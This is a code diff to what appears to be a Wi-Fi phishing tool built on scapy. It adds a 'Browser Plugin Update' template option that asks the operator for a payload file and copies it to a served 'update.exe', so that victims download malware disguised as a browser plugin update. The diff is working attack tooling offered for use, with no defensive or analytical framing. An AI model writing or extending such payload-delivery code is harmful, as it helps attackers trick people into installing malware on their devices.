@@ -18,6 +18,7 @@ from subprocess import Popen, PIPE, check_output
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from shutil import copyfile
 import phishingpage
 from constants import *
 
@@ -1071,6 +1072,30 @@ if __name__ == "__main__":
 
     print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
            " template")
+
+    # payload selection for browser plugin update
+
+    if "Browser Plugin Update" in template.get_display_name():
+
+        # get payload path
+        payload_path = raw_input("\n[" + G + "+" + W +
+                                     "] Enter the [" + G + "full path" + W +
+                                     "] to the payload you wish to serve: ")
+
+        # copy payload to update directory
+
+        while not os.path.isfile(payload_path):
+            
+            print "Invalid file path"
+
+            payload_path = raw_input("\n[" + G + "+" + W +
+                                     "] Enter the [" + G + "full path" + W +
+                                     "] to the payload you wish to serve: ")            
+
+        print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
+
+        copyfile(payload_path, './phishing-pages/plugin_update/update/update.exe')
+
 
     # set the path for the template
     TEMPLATE_PATH = template.get_path()
